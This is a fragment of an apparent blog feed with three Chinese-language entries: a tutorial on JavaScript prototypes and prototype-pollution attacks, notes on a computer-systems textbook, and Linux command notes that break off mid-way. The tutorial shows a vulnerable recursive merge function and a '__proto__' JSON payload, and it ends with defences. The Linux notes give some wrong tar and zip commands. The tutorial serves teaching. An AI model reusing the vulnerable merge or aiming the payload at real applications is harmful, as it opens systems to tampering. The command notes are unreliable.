    <content type="html"><![CDATA[<h4 id="JavaScript原型"><a href="#JavaScript原型" class="headerlink" title="JavaScript原型"></a>JavaScript原型</h4><p>在JavaScript中，原型也是一个对象，通过原型可以实现对象的属性继承，JavaScript的对象中都包含了一个<code>[[Prototype]]</code>内部属性，这个属性所对应的就是该对象的原型。<code>[[Prototype]]</code>作为对象的内部属性，是不能被直接访问的，所以为了方便的查看一个对象的原型，Firefox和Chrome提供了<code>__proto__</code>这个非标准的访问器。每个对象拥有一个原型对象，对象以其原型为模版，从原型继承方法和属性，原型对象也可能拥有原型，并从中继承方法和属性，层层递推，这种关系被称为原型链。</p><p><img src="/2021/09/23/JavaScript原型链污染攻击/1.png" alt="1"></p><p>其中，<code>foo</code>是一个<code>Foo</code>类的实例，有两个属性：bar、[[Prototype]]，其中bar是我们构造函数中定义的，而[[Prototype]]就是<code>Foo.prototype</code>，在JavaScript中，每个函数都有一个prototype属性，当一个函数被用作构造函数来创建实例时，该函数的prototype属性将被作为原型赋值给所有对象实例，也就是说，所有实例的原型引用的是函数的prototype属性。遵循ECMAScript标准，<code>Foo.[[Prototype]]</code> 符号是用于指向 <code>Foo</code> 的原型。从 ECMAScript 6 开始，<code>[[Prototype]]</code> 可以通过 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/GetPrototypeOf" target="_blank" rel="noopener"><code>Object.getPrototypeOf()</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/setPrototypeOf" target="_blank" rel="noopener"><code>Object.setPrototypeOf()</code></a> 访问器来访问。这个等同于 JavaScript 的非标准但许多浏览器实现的属性 <code>__proto__</code>。</p><p><img src="/2021/09/23/JavaScript原型链污染攻击/2.webp" alt="2"></p><p>如上图所示是一个原型链图，其中Parent是构造函数，p1是通过Parent实例化出来的一个对象。当谈到继承时，JavaScript只有一种数据结构：对象。每个实例对象都有一个私有属性(<code>__proto__</code>)指向它的构造函数的原型对象(prototype)。该原型对象也有一个自己的原型对象(<code>__proto__</code>)，层层向上知道一个对象的原型对象为<code>null</code>，根据定义<code>null</code>没有原型，并作为这个原型链中的最后一个环节。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> Parent = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> p1 = <span class="keyword">new</span> Parent();</span><br></pre></td></tr></table></figure><h4 id="prototype属性"><a href="#prototype属性" class="headerlink" title="prototype属性"></a>prototype属性</h4><p><code>prototype</code>是函数独有的属性，从 上图可以看到它从一个函数指向另一个对象，代表这个对象是这个函数的原型对象，这个对象也是当前函数所创建的实例的原型对象。有了<code>prototype</code>我们不需要为每一个实例创建重复的属性方法，而是将属性方法创建在构造函数的原型对象上（prototype）。那些不需要共享的才创建在构造函数中。</p><h4 id="proto属性"><a href="#proto属性" class="headerlink" title="proto属性"></a>proto属性</h4><p><code>__proto__</code>属性时对象(包括函数)独有的，从图中可以看到<code>__proto__</code>属性是从一个对象指向另一个对象，即从一个对象指向该对象的原型对象，<code>Parent.prototype</code>上添加的属性和方法叫做原型属性和原型方法，该构造函数的实例都可以访问调用。那这个构造函数的原型对象上的属性和方法，怎么能和构造函数的实例联系在一起呢，就是通过<code>__proto__</code>属性。每个对象都有<code>__proto__</code>属性，该属性指向的就是该对象的原型对象。<code>__proto__</code>通常称为隐式原型，<code>prototype</code>通常称为显式原型，那我们可以说一个对象的隐式原型指向了该对象的构造函数的显式原型。那么我们在显式原型上定义的属性方法，通过隐式原型传递给了构造函数的实例。这样一来实例就能很容易的访问到构造函数原型上的方法和属性了。</p><h4 id="constructor-NaN"><a href="#constructor-NaN" class="headerlink" title="constructor"></a>constructor</h4><p><code>constructor</code>是对象才有的属性，它是从一个对象指向一个函数的，指向的函数就是该对象的构造函数，每个对象都有构造函数。</p><h4 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h4><p>对于JavaScript而言，很少有真正的私有属性，类的所有属性都允许被公开的访问和修改，包括proto、构造函数和原型，攻击者可以通过注入其他值来覆盖或污染这些proto、构造函数和原型属性，然后，所有继承了被污染原型的对象都会受到影响，原型链污染通常会导致拒绝服务、篡改程序执行流程、RCE等。</p><p>如下定义一个递归合并函数merge()</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> merge = <span class="function">(<span class="params">target, source</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">of</span> <span class="built_in">Object</span>.keys(source)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (source[key] <span class="keyword">instanceof</span> <span class="built_in">Object</span>) <span class="built_in">Object</span>.assign(source[key], merge(target[key], source[key]))</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">Object</span>.assign(target || &#123;&#125;, source)</span><br><span class="line">  <span class="keyword">return</span> target</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name,age,gender</span>)</span>&#123;</span><br><span class="line"><span class="keyword">this</span>.name=name;</span><br><span class="line"><span class="keyword">this</span>.age=age;</span><br><span class="line"><span class="keyword">this</span>.gender=gender;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> newperson=<span class="keyword">new</span> Person(<span class="string">"test1"</span>,<span class="number">22</span>,<span class="string">"male"</span>);</span><br><span class="line"><span class="keyword">let</span> job=<span class="built_in">JSON</span>.parse(<span class="string">'&#123;"title":"Security Engineer","country":"China","male":"true"&#125;'</span>);</span><br><span class="line">merge(newperson,job);</span><br><span class="line"><span class="built_in">console</span>.log(newperson);</span><br></pre></td></tr></table></figure><p>对于上述代码，如果job对象是由用户输入的，并且输入是任意的，那么我们可以输入一个含有proto属性的对象，那当合并的时候就可以把Person的原型给修改了。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> job=<span class="built_in">JSON</span>.parse(<span class="string">'&#123;"title":"Security Engineer","country":"China","__proto__":&#123;"x":1&#125;&#125;'</span>);</span><br></pre></td></tr></table></figure><p>修改后的结果如下图所示</p><p><img src="/2021/09/23/JavaScript原型链污染攻击/3.png" alt="3"></p><p>这里需要注意的是，只有不安全的递归合并函数才会导致原型链污染，非递归的算法并不会导致原型链污染，例如JavaScript自带的<code>Object.assign</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function Person(name,age,gender)&#123;</span><br><span class="line">this.name=name;</span><br><span class="line">this.age=age;</span><br><span class="line">this.gender=gender;</span><br><span class="line">&#125;</span><br><span class="line">let person1=new Person(&quot;test1&quot;,22,&quot;male&quot;);</span><br><span class="line">let job=JSON.parse(&apos;&#123;&quot;title&quot;:&quot;Security Engineer&quot;,&quot;country&quot;:&quot;China&quot;,&quot;__proto__&quot;:&#123;&quot;x&quot;:1&#125;&#125;&apos;);</span><br><span class="line">Object.assign(person1,job);</span><br><span class="line">console.log(Person.prototype);</span><br></pre></td></tr></table></figure><p><img src="/2021/09/23/JavaScript原型链污染攻击/4.png" alt="4"></p><h4 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h4><ul><li>字符串可以被解析为方法或对象，例如<code>JSON.parse</code>进行解析，<code>shvl</code>库使用点对属性操作。</li><li>对象的键和值都可控，<code>target[key] = value</code></li></ul><h4 id="如何防御"><a href="#如何防御" class="headerlink" title="如何防御"></a>如何防御</h4><ul><li>禁止操作<code>constructor</code></li><li>禁止操作<code>prototype</code></li><li>禁止操作<code>__proto__</code></li></ul><h4 id="JS原型小结"><a href="#JS原型小结" class="headerlink" title="JS原型小结"></a>JS原型小结</h4><ul><li><code>__proto__</code>、<code>constructor</code>属性是对象所独有的</li><li><code>prototype</code>属性是函数独有的</li><li>在js中函数也是对象的一种，那么函数同样也有属性<code>__proto__</code>、<code>constructor</code></li><li>所有的引用类型都有一个<code>__proto__</code>属性（也叫隐式属性，是一个普通的对象）</li><li>所有的函数都有一个<code>prototype</code>属性（也叫显式属性，是一个普通的对象）</li><li>当试图得到一个对象属性时，如果这个对象本身不存在这个属性，会从它的构造函数的<code>prototype</code>属性中去寻找</li></ul><h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><ul><li><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</a></li><li><a href="https://www.freebuf.com/articles/web/275619.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/275619.html</a></li><li><a href="https://www.cnblogs.com/wilber2013/p/4924309.html" target="_blank" rel="noopener">https://www.cnblogs.com/wilber2013/p/4924309.html</a></li><li><a href="https://segmentfault.com/a/1190000021232132" target="_blank" rel="noopener">https://segmentfault.com/a/1190000021232132</a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;JavaScript原型&quot;&gt;&lt;a href=&quot;#JavaScript原型&quot; class=&quot;headerlink&quot; title=&quot;JavaScript原型&quot;&gt;&lt;/a&gt;JavaScript原型&lt;/h4&gt;&lt;p&gt;在JavaScript中，原型也是一个对象，通过原型可以实现
      
    
    </summary>
    
    
      <category term="web安全" scheme="elssm.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>深入理解计算机系统（一）</title>
    <link href="elssm.github.io/2021/09/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>elssm.github.io/2021/09/16/深入理解计算机系统（一）/</id>
    <published>2021-09-16T11:07:17.000Z</published>
    <updated>2021-09-18T13:54:12.373Z</updated>
    
    <content type="html"><![CDATA[<h3 id="系统漫游"><a href="#系统漫游" class="headerlink" title="系统漫游"></a>系统漫游</h3><h4 id="Hello-world"><a href="#Hello-world" class="headerlink" title="Hello world"></a>Hello world</h4><p>从<code>hello world</code>说起。<code>hello world</code>程序的生命周期是从一个源程序开始的，程序员通过编辑器创建并保存的文本文件，文件名为<code>hello.c</code>。源程序实际上是一个由0和1组成的位序列。8个位被组织成一组，称为字节。每个字节表示程序中的某些文本字符。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"hello,world\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>hello.c</code>程序是以字节序列的方式存储在文件中的，每个字节都有一个整数值，对应于某些字符。例如第一个字节的整数值是35，对应的字符是“#”。需要注意的是，每个文本行都是以一个看不见的换行符“\n”来结束的，像<code>hello.c</code>这样只由ASCII字符构成的文件称为文本文件，所有其他文件都称为二进制文件。</p><p><code>hello.c</code>的表示方法说明了一个基本思想，系统中所有的信息包括磁盘文件、内存中存放的用户数据以及网络上传送的数据，都是由一串比特表示的。区分不同数据对象的唯一方法是我们读到这些数据对象时的上下文。在不同上下文中，一个发相同的字节序列可能表示一个整数、浮点数、字符串或者机器指令。</p><h4 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h4><p><code>hello</code>程序的生命周期是从一个高级C语言程序开始的，因为这种形式能够被人读懂，然而为了在系统上运行<code>hello.c</code>程序，每条C语言都必须被其他程序转化为一系列的低级机器语言指令。然后这些指令按照一种称为可执行目标程序的格式打好包。并以二进制磁盘文件的形式存放起来，目标程序也被称为可执行目标文件。</p><p>在Unix系统上，从源文件到目标文件的转化是由编译器驱动程序完成的。</p><p><img src="/2021/09/16/深入理解计算机系统（一）/1.png" alt="1"></p><p>在这里，GCC编译器驱动程序读取源程序文件<code>hello.c</code>，并把它翻译成一个可执行目标文件<code>hello</code>。这个翻译过程可分为以上四个阶段完成。执行这四个阶段的程序一起构成了编译系统。</p><ul><li>预处理阶段。预处理器根据以字符<code>#</code>开头的命令，修改原始的C程序。比如<code>hello.c</code>中第一行的命令告诉预处理器读取系统头文件<code>stdio.h</code>的内容，并把它直接插入程序文本中。结果就得到了另一个C程序，通常是以<code>.i</code>作为文件扩展名。</li><li>编译阶段。编译器将文本文件<code>hello.i</code>翻译成文本文件<code>hello.s</code>，它包含一个汇编语言程序，该程序包含函数main的定义。</li><li>汇编阶段。汇编器将<code>hello.s</code>翻译成机器语言指令，把这些指令打包成一种叫做可重定位目标程序的格式，并将结果保存在目标文件<code>hello.o</code>中，<code>hello.o</code>文件是一个二进制文件，它包含的17个字节是函数main的指令编码。</li><li>链接阶段。hello程序调用了printf函数，它是每个C编译器豆提供的标准C库中的一个函数。printf函数存在于一个名为<code>printf.o</code>的单独的预编译好了的目标文件中，而这个文件必须以某种方式合并到我们的<code>hello.o</code>程序中，链接器就负责处理这种合并，结果就得到hello文件，它是一个可执行目标文件，可以被加载到内存中，由系统执行。</li></ul><h4 id="系统硬件组成"><a href="#系统硬件组成" class="headerlink" title="系统硬件组成"></a>系统硬件组成</h4><ul><li><strong>总线</strong>：贯穿整个系统的是一组电子管道，称作总线，它携带信息字节并负责在各个部件间传递。通常总线被设计成传送定长的字节块，也就是字。</li><li><strong>I/O设备</strong>：I/O设备是系统与外部世界的联系通道。，我们的示例系统包括四个I/O设备：作为用户输入的键盘和鼠标，作为用户输出的显示器，以及用于长期存储数据和程序的磁盘启动器，最开始，可执行程序就存放在磁盘上。<strong>每个I/O设备都通过一个控制器或适配器与I/O总线相连。</strong>控制器和适配器之间的区别主要在于它们的封装方式。</li><li><strong>主存</strong>：主存是一个临时存储设备。在处理器执行程序时，用来存放程序和程序处理的数据，从物理上来说，主寸是由一组动态随机存取存储器（DRAM）芯片组成的。从逻辑上来说，存储器是一个线性的字节数组，每个字节都有其唯一的地址，这些地址是从零开始的。一般来讲，组成程序的每条机器指令都由不同数量的字节构成。</li><li><strong>处理器</strong>：处理器是解释存储在主存中指令的引擎，处理器的核心是一个大小为一个字的存储设备，称为程序计数器(PC)。在任何时刻，PC都指向主存中的某条机器语言指令（即含有该条指令的地址）</li></ul><p>一个典型系统的硬件组成如下图所示</p><p><img src="/2021/09/16/深入理解计算机系统（一）/2.png" alt="2"></p><h4 id="程序的运行"><a href="#程序的运行" class="headerlink" title="程序的运行"></a>程序的运行</h4><ul><li><p>初识时，shell程序执行它的指令，等待我们输入一个命令。当我们在键盘上输入字符串<code>./hello</code>时，shell程序将字符逐一读入寄存器，再把它存放到内存中。</p></li><li><p>当我们在键盘上敲回车键时，shell程序就知道我们已经结束了命令的输入，然后shell执行一系列指令来加载可执行的hello文件，这些指令将hello目标文件中的代码和数据从磁盘复制到主存。</p></li><li>通过DMA，数据可以不通过处理器而直接从磁盘到达主存。</li><li>一旦hello中的代码和数据被加载到主存，处理器就开始执行hello程序中的main程序中的机器语言指令，这些指令将”hello,world\n”字符串中的字节从主存复制到寄存器文件，再从寄存器文件中复制到显示设备。最终显示在屏幕上。</li></ul><h4 id="高速缓存的重要性"><a href="#高速缓存的重要性" class="headerlink" title="高速缓存的重要性"></a>高速缓存的重要性</h4><p>没有高速缓存，系统将会花费大量的时间把信息从一个地方挪到另一个地方，例如机器指令从磁盘复制到主存，从主存复制到处理器。数据也是如此，从磁盘复制到主存，从主存复制到显示设备。根据机械原理，较大的存储设备要比较小的存储设备运行的慢。类似的，一个典型的寄存器文件只存储几百字节的信息，而主存里可存放几十亿字节，然而，处理器从寄存器文件中读取数据比从主存中读取数据几乎要快100倍。随着近几年半导体技术的进步，这种处理器与主存之间的差距还在持续增大。针对这种处理器与主存之间的差异，系统设计者采用了更小更快的存储设备。称为高速缓存存储器。作为暂时的集结区域，存放处理器近期可能会需要的信息。</p><p><img src="/2021/09/16/深入理解计算机系统（一）/3.png" alt="3"></p><h4 id="操作系统管理硬件"><a href="#操作系统管理硬件" class="headerlink" title="操作系统管理硬件"></a>操作系统管理硬件</h4><p>我们可以把操作系统看成是应用程序和硬件之间插入的一层软件，所有应用程序对硬件的操作尝试都必须通过操作系统。<br>操作系统有两个基本功能</p><ul><li><p>防止硬件被失控的应用程序滥用</p></li><li><p>向应用程序提供简单一致的机制来控制复杂而又通常大不相同的低级硬件设备</p></li></ul><p>操作系统通过几个基本的抽象概念（进程、虚拟内存和文件）来实现这两个功能，其中，文件是对I/O设备的抽象表示，虚拟内存是对主存和磁盘I/O设备的抽象表示，进程则是对处理器、主存和I/O设备的抽象表示。</p><h4 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h4><p>进程是操作系统对一个正在运行的程序的一种抽象。在一个系统上可以同时运行多个进程，而每个进程都好像在独占地使用硬件。并发运行，则是说一个进程的指令和另一个进程的指令是交错执行的，在大多数系统中，需要运行的进程数是多于可以运行它们的CPU个数的。传统系统在一个时刻只能执行一个程序，而先进的多核处理器同时能够执行多个程序。这具体的表现在，无论是在单核还是在多核系统中，一个CPU看上去都像是在并发的执行多个进程，这是通过处理器在进程间切换来实现的，操作系统实现这种交错执行的机制称为上下文切换。</p><p><img src="/2021/09/16/深入理解计算机系统（一）/4.png" alt="4"></p><p>如上图所示，从一个进程到另一个进程的转换是通过操作系统内核来管理的，内核是操作系统代码常驻主存的部分，当应用程序需要操作系统的某些操作时，比如读写文件，它就执行一条特殊的系统调用指令，将控制权传递给内核，然后内核执行被请求的操作并返回应用程序。（内核不是一个独立的进程，它是系统管理全部进程所用代码和数据结构的集合）</p><h4 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h4><p>一个进程实际上可以由多个称为线程的执行单元组成，每个线程都运行在进程的上下文中，并共享同样的代码和全局数据。多线程之间比多进程之间更容易共享数据，并且线程一般来说都比进程更高效，当有多处理器可用的时候，多线程也是一种使得程序可以运行得更快的方法。</p><h4 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h4><p>虚拟内存是一个抽象概念，它为每个进程提供了一个假象，即每个进程都在独占地使用主存，每个进程看到的内存都是一致的，称为虚拟地址空间。在Linux中，地址空间最上面的区域时保留给操作系统中的代码和数据的，这对所有进程来说都是一样的，地址空间的底部区域存放用户进程定义的代码和数据。</p><p><img src="/2021/09/16/深入理解计算机系统（一）/5.png" alt="5"></p><ul><li><strong>程序代码和数据</strong>。对所有的进程来说，代码是从同一固定地址开始，紧接着的是和C全局变量相对应的数据位置，代码和数据去是直接按照可执行目标文件的内容初始化的。</li><li><strong>堆</strong>。代码和数据去后紧随着的是运行时堆，代码和数据去在进程一开始运行时就被指定了大小，而调用像malloc和free这样的C标准库函数时，堆可以在运行时动态地扩展和收缩。</li><li><strong>共享库</strong>。大约在地址空间的中间部分时一块用来存放像C标准库和数学库这样的共享库的代码和数据的区域。</li><li><strong>栈</strong>。位于用户虚拟地址空间顶部的是用户栈，编译器用它来实现函数调用，和堆一样，用户栈在程序执行期间可以动态地扩展和收缩，特别的，每次我们调用一个函数时，栈就会增长，从一个函数返回时，栈就会收缩。</li><li><strong>内核虚拟内存</strong>。地址空间顶部的区域是为内核保留的，不允许应用程序读写这个区域的内容或者直接调用内核代码定义的函数。</li></ul><h4 id="并发和并行"><a href="#并发和并行" class="headerlink" title="并发和并行"></a>并发和并行</h4><h5 id="线程级并发"><a href="#线程级并发" class="headerlink" title="线程级并发"></a>线程级并发</h5><p>使用线程，我们能够在一个进程汇总执行多个控制流，自20世纪60年代初期出现时间共享以来，计算机系统中就开始有了对并发执行的支持。传统意义上，这种并发执行只是模拟出来的，是通过使一台计算机在它正在执行的进程间快速切换来实现的。在以前，即使处理器必须在多个任务间切换，大多数实际的计算也都是由一个处理器来完成的，这种配置称为<strong>单处理器系统</strong>。当构建一个由单操作系统内核控制的多处理器组成的系统时，我们就得到了一个<strong>多处理器系统</strong>。多核处理器是将多个CPU集成到一个集成电路芯片上，如下图所示为多核处理器的组织架构。</p><p><img src="/2021/09/16/深入理解计算机系统（一）/6.png" alt="6"></p><h5 id="指令级并行"><a href="#指令级并行" class="headerlink" title="指令级并行"></a>指令级并行</h5><p>在较低的抽象层次上，现代处理器可以同时执行多条指令的属性称为指令级并行。通过使用流水线技术，将执行一条指令所需要的活动划分为不同的步骤，将处理器的硬件组织成一系列的阶段，每个阶段执行一个步骤。这些阶段可以并行地操作，用来处理不同指令的不同部分。</p><h5 id="单指令、多数据并行"><a href="#单指令、多数据并行" class="headerlink" title="单指令、多数据并行"></a>单指令、多数据并行</h5><p>在最低层次上，许多现代处理器拥有特殊的硬件，允许一条指令产生多个可以并行执行的操作，这种方式称为单指令、多数据，即SIMD并行。</p><h4 id="计算机系统的抽象表示"><a href="#计算机系统的抽象表示" class="headerlink" title="计算机系统的抽象表示"></a>计算机系统的抽象表示</h4><p><img src="/2021/09/16/深入理解计算机系统（一）/7.png" alt="7"></p><p>计算机系统提供了不同层次的抽象表示来隐藏实际实现的复杂性。如上图所示，在处理器里，指令集架构提供了对实际处理器硬件的抽象，使用这个抽象，机器代码程序表现的好像运行在一个一次只执行一条指令的处理器上。对于我们而言，底层的硬件要比抽象描述更加复杂，它并行的执行多条指令，但又总是与那个简单有序的模型保持一致，只要执行模型一样，不同的处理器实现也能执行同样的机器代码，而又提供不同的开销和性能。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;系统漫游&quot;&gt;&lt;a href=&quot;#系统漫游&quot; class=&quot;headerlink&quot; title=&quot;系统漫游&quot;&gt;&lt;/a&gt;系统漫游&lt;/h3&gt;&lt;h4 id=&quot;Hello-world&quot;&gt;&lt;a href=&quot;#Hello-world&quot; class=&quot;headerlink&quot; ti
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="elssm.github.io/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Linux系统编程</title>
    <link href="elssm.github.io/2021/09/15/Linux%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/"/>
    <id>elssm.github.io/2021/09/15/Linux系统编程/</id>
    <published>2021-09-15T07:14:24.000Z</published>
    <updated>2021-10-05T06:18:39.378Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h4><p>命令解释器，根据舒服的命令执行相应命令</p><p>查看当前系统下有哪些shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/shells</span><br></pre></td></tr></table></figure><p>查看当前系统正在使用的shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $SHELL</span><br></pre></td></tr></table></figure><p>常见shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash（就是linux的默认的shell）</span><br><span class="line">/bin/csh（已经被/bin/tcsh所取代）</span><br><span class="line">/bin/dash</span><br><span class="line">/bin/ksh（Kornshell由AT&amp;T Bell lab发展出来的，兼容于bash）</span><br><span class="line">/bin/sh（已经被/bin/bash所取代）</span><br><span class="line">/bin/tcsh（整合C Shell，提供更多功能）</span><br><span class="line">/bin/zsh（基于ksh发展出来的，功能更强大的shell）</span><br></pre></td></tr></table></figure><h4 id="主键功能"><a href="#主键功能" class="headerlink" title="主键功能"></a>主键功能</h4><div class="table-container"><table><thead><tr><th>功能</th><th>快捷键</th><th>助记</th></tr></thead><tbody><tr><td>Home</td><td>Ctrl-a</td><td>The first letter</td></tr><tr><td>End</td><td>Ctrl-e</td><td>end</td></tr><tr><td>Clear</td><td>Ctrl-u</td><td>Clear</td></tr></tbody></table></div><h4 id="类Unix系统目录"><a href="#类Unix系统目录" class="headerlink" title="类Unix系统目录"></a>类Unix系统目录</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bin:存放二进制可执行文件</span><br><span class="line">boot:存放开机启动程序</span><br><span class="line">dev:存放设备文件</span><br><span class="line">home:存放用户</span><br><span class="line">etc:用户信息和系统配置文件</span><br><span class="line">lib:库文件</span><br><span class="line">root:管理员宿主目录</span><br><span class="line">usr:用户资源管理目录</span><br></pre></td></tr></table></figure><h4 id="Linux系统文件类型"><a href="#Linux系统文件类型" class="headerlink" title="Linux系统文件类型"></a>Linux系统文件类型</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">普通文件：-</span><br><span class="line">目录文件：d </span><br><span class="line">字符设备文件：c</span><br><span class="line">块设备文件：b</span><br><span class="line">软连接：l</span><br><span class="line">管道文件：p</span><br><span class="line">套接字：s</span><br><span class="line">未知文件</span><br></pre></td></tr></table></figure><p>软链接：为保证软链接可以任意搬移，创建时务必对源文件使用绝对路径</p><p>硬链接：操作系统给每一个文件赋予唯一的inode，当有相同inode的文件存在时，彼此同步。删除时，只将硬链接计数减一。减为0时，inode被释放。</p><h4 id="find"><a href="#find" class="headerlink" title="find"></a>find</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-type 按文件类型搜索</span><br><span class="line">-name 按文件名搜索</span><br><span class="line">-maxdepth 指定搜索深度</span><br><span class="line">-size 按文件大小搜索，单位：k、M、G</span><br><span class="line">-atime、mtime、ctime</span><br><span class="line">-exec 将find搜索的结果集执行某一指定命令</span><br><span class="line">-ok 以交互式的方式将find搜索的结果集执行某一指定命令</span><br><span class="line">-xargs 将find搜索的结果集执行某一指定命令，当结果集数量过大时，可以分片映射</span><br></pre></td></tr></table></figure><h4 id="压缩解压缩"><a href="#压缩解压缩" class="headerlink" title="压缩解压缩"></a>压缩解压缩</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">压缩</span><br><span class="line">tar -zcvf 要生成的压缩包名 压缩材料</span><br><span class="line">tar zcvf test.tar.gz file1 dir2 使用gzip方式压缩</span><br><span class="line">tar jcvf test.tar.gz file1 dir2 使用bzip2方式压缩</span><br><span class="line"></span><br><span class="line">解压</span><br><span class="line">  tar xcvf test.tar.gz 使用gzip方式解压</span><br><span class="line">tar xcvf test.tar.gz 使用bzip2方式解压</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rar</span><br><span class="line"></span><br><span class="line">rar a -r newdir dir 打包：将dir压缩成newdir.dir</span><br><span class="line">unrar x newdir.rar 解包：把newdir.rar解压缩到当前目录</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">zip</span><br><span class="line"></span><br><span class="line">zip -r dir.zip dir 打包</span><br><span class="line">zip dir.zip 解压</span><br></pre></td></tr></table></figure><h4 id="vim基础操作"><a href="#vim基础操作" class="headerlink" title="vim基础操作"></a>vim基础操作</h4><p>进入插入模式</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">i:插入光标前一个字符</span><br><span 